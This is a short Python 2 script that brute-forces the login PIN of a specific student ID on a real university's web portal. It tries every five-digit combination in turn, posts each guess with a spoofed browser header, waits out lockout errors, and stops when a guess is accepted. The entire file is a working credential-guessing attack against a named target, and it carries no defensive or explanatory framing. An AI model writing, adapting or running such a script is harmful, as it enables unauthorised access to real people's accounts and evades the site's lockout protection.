import itertools
import requests
from bs4 import BeautifulSoup
import time

chrs = '0123456789'
n = 5
a=[]
url = "https://uos.sharjah.ac.ae:9050/prod_enUS/twbkwbis.P_ValLogin"
s = requests.Session()
i=0
gotit=""
for xs in itertools.product(chrs, repeat=n):
	print i
	b = ''.join(xs)
	payload = "sid=u00043192&PIN="+''.join(xs)+"192"
	headers = {
		'content-type': "application/x-www-form-urlencoded",
		'Accept-Encoding': 'identity',
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36"
		}
	test = s.request("GET",url, headers=headers)
	print(s.cookies.get_dict())
	response = s.request("POST", url, data=payload, headers=headers,cookies=s.cookies.get_dict())
	print response.text
	if("Error occurred during logon" in response.text):
		time.sleep(60)
		continue
	if(not "Invalid" in response.text):
		gotit = ''.join(xs)
		break
	i = i+1
	time.sleep(0.1)
print gotit
